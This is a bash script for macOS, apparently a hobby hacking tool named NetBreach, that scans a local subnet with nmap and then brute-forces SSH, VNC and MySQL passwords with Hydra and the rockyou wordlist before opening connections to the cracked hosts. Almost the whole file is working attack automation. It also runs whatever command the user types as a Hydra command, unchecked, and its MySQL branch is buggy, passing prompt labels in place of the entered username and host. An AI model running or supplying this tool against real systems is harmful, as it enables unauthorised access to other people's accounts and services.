#!/bin/bash
source DontEdit.sh  # Source external script for variables or functions

# Check if the user is connected via SSH; exit if connected
if [ -n "${SSH_CLIENT}" ]; then
    echo "Connected via SSH"
    exit 1
else
    echo "Not connected via SSH"
fi

# Function to handle cleanup and exit when Ctrl+C is pressed
EXIT_PROGRAM_WITH_CTRL_C() {
    osascript -e 'display notification "Exiting Software..." with title "Exit Notification"'  # Display exit notification
    exit 1
}

# Function to handle cleanup and exit when Ctrl+Z is pressed
EXIT_PROGRAM_WITH_CTRL_Z(){
    osascript -e 'display notification "Exiting Software..." with title "Exit Notification"'  # Display exit notification
    exit 1
}

# Function to be executed when Ctrl+Z is pressed; triggers cleanup
handle_ctrl_z() {
    EXIT_PROGRAM_WITH_CTRL_Z
}

# Set up trap to call the Ctrl+Z handler function
trap 'handle_ctrl_z' SIGTSTP

# Function to handle Ctrl+C; calls exit function
ctrl_c() {
    EXIT_PROGRAM_WITH_CTRL_C
}

# Set up trap to call the Ctrl+C handler function
trap ctrl_c SIGINT

# Clear the terminal
clear

# Initialize variables
total_steps=100
userName="Input Username:"  # Message for username prompt
hostName="Input Hostname:"  # Message for hostname prompt

# Function to check if a command exists on the system
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Loop through required packages and check if they are installed
for package in "${required_packages[@]}"; do
    if ! command_exists "${package}"; then
        # Prompt the user to install missing package
        osascript -e "display dialog \"The required package '$package' is not installed. Would you like me to install it for you?\" buttons {\"Yes\", \"No\"} default button \"Yes\""
        choice=$(osascript -e "button returned of result")

        if [ "$choice" == "Yes" ]; then
            bash requirements.sh  # Run script to install missing packages
            exit 1
        else
            osascript -e 'display notification "Stopping program due to missing package." with title "Program Stopped"'  # Notify user of program stop
            exit 1
        fi
    fi
done

# Check if the script is run with --help or -h; display help info if true
if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
    # Display help information about the program
    osascript -e 'display dialog "This program helps crack passwords using Hydra and Nmap.\nTo use the program, specify the port to scan, and it will check for open ports and attempt to crack passwords." buttons {"OK"} default button "OK"'
else
    # Check if the OS type matches the expected OS type
    if [[ "$OSTYPE" == "${OS}"* ]]; then

        # Function to scan ports
        NetBreach() {
            figlet -f slant "${NameOfProgram}"  # Display program name in ASCII art
            options_text="Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL'.\nIf you want to stop the program, type 'stop'."
            # Prompt user for port number to scan
            service=$(osascript -e "display dialog \"$options_text\" default answer \"\" buttons {\"OK\"} default button \"OK\"" -e 'text returned of result')
            
            # Exit if user types 'stop'
            if [[ "${service}" == "stop" ]]; then
                osascript -e 'display notification "Stopping program." with title "Program Stopped"'
                exit 1
            else
                osascript -e "display notification \"The port you are scanning is: ${service}\" with title \"Port Scan\""  # Notify user of port being scanned
            fi
            
            # Check if the user wants to scan all ports
            if [[ "${service}" == "ALL" ]]; then
                osascript -e 'display notification "Scanning all ports. This may take up to 1 hour to complete." with title "Port Scan"'  # Notify user about the scan duration
                sudo nmap 192.168.1.1/24 -Pn -oN scan.txt --open  # Run Nmap scan for all ports
                # Prompt user for Hydra command input
                Hydra_input=$(osascript -e "display dialog \"Input Hydra command to use a custom hacking technique.\" default answer \"\" buttons {\"OK\"} default button \"OK\"" -e 'text returned of result')

                if [[ "${Hydra_input}" == "" ]]; then
                    osascript -e 'display notification "Stopping program." with title "Program Stopped"'  # Notify user of program stop
                    exit 1
                else
                    $Hydra_input  # Execute user input as command
                    exit 1
                fi
            elif [[ "${service}" == "" ]]; then
                # Prompt user to input a port number if the field is left blank
                osascript -e "display dialog \"Please input a number into the input field.\" buttons {\"OK\"} default button \"OK\""
                NetBreach  # Restart the function to prompt again
            else
                # Scan the specified port and save the output to a log file
                osascript -e "display notification \"Scanning port ${service}.\" with title \"Port Scan\""
                nmap 192.168.1.1/24 -p "${service}" -oN "${service}.log" --open
                # Prompt user to open the log file after scanning
                OpenFileOrNo=$(osascript -e "display dialog \"Would you like to open the file ${service}.log?\" buttons {\"Yes\", \"No\"} default button \"Yes\"" -e 'button returned of result')

                if [ "$OpenFileOrNo" == "Yes" ]; then
                    open "${service}.log"  # Open the log file if the user selects Yes
                else
                    osascript -e 'display notification "File not opened." with title "Action"'  # Notify user that the file was not opened
                    sleep 1
                fi
            fi
        }

        # Function to collect user and host information for further actions
        RunHackingCommand() {
            # Notify user about specific input requirements based on services
            osascript -e 'display notification "Hacking command" with title "To crack VNC(5900), leave Input Username empty. To crack MySQL(3306), type localhost in Input Hostname"'
            
            # Prompt for username
            user=$(osascript -e "display dialog \"$userName\" default answer \"\" buttons {\"OK\"} default button \"OK\"" -e 'text returned of result')
            # Prompt for hostname
            host=$(osascript -e "display dialog \"$hostName\" default answer \"\" buttons {\"OK\"} default button \"OK\"" -e 'text returned of result')
        }

        # Function to crack VNC passwords
        RunHackingCommandWithVNC() {
            # Check if the selected service is VNC (port 5900)
            if [[ $service == 5900 || $service == "VNC" ]]; then
                # Validate that required fields are filled
                if [[ $user == "" && $host == "" || $host == "" ]]; then
                    osascript -e 'display notification "No service specified." with title "Error"'  # Notify of missing service specification
                    NetBreach  # Restart port scanning function
                else
                    # Run Hydra for VNC password cracking
                    hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://"$host"
                    osascript -e "display notification \"Connecting to ${host}. Please wait...\" with title \"Connecting to VNC Server\""
                    sleep 5  # Simulate waiting time
                    osascript -e "display notification \"Connected to ${host}. Enter the password to continue...\" with title \"VNC Connection\""
                    open "vnc://${host}"  # Open VNC connection
                    exit 1
                fi
            fi
        }

        # Function to crack SSH passwords
        RunHackingCommandWithSSH() {
            # Check if the selected service is SSH (port 22)
            if [[ $service == 22 || $service == "SSH" ]]; then
                # Validate that required fields are filled
                if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                    osascript -e 'display notification "No service specified." with title "Error"'  # Notify of missing service specification
                    NetBreach  # Restart port scanning function
                else
                    # Run Hydra for SSH password cracking
                    hydra -l "$user" -P rockyou.txt -t 64 -vV -o output.log -I ssh://"${host}"
                    osascript -e "display notification \"Connecting to ${user}. Please wait...\" with title \"Connecting to SSH Server\""
                    sleep 5  # Simulate waiting time
                    osascript -e "display notification \"Connected to ${user}. Enter the password to continue...\" with title \"SSH Connection\""
                    ssh "${user}"@"${host}"  # Open SSH connection
                fi
            fi
        }

        # Function to crack MySQL passwords
        RunHackingCommandWithMySQL() {
            # Check if the selected service is MySQL (port 3306)
            if [[ $service == 3306 || $service == "mysql" ]]; then
                # Validate that required fields are filled
                if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                    osascript -e 'display notification "No service specified." with title "Error"'  # Notify of missing service specification
                    NetBreach  # Restart port scanning function
                else
                    # Run Hydra for MySQL password cracking
                    hydra -l "$userName" -P rockyou.txt -t 64 -vV -o output.log -I mysql://"$hostName"
                    osascript -e "display notification \"Connecting to ${user}. Please wait...\" with title \"Connecting to MySQL Server\""
                    sleep 3  # Simulate waiting time
                    mysql -u "${userName}" -p -A  # Open MySQL connection
                fi
            fi
        }

        # Call functions in the correct sequence
        NetBreach
        RunHackingCommand
        RunHackingCommandWithVNC
        RunHackingCommandWithSSH
        RunHackingCommandWithMySQL
    else
        # Warning message if the script is run on an incorrect OS
        osascript -e 'display dialog "WARNING: Wrong OS. Please use the correct OS." buttons {"OK"} default button "OK"'
        exit 1
    fi
fi
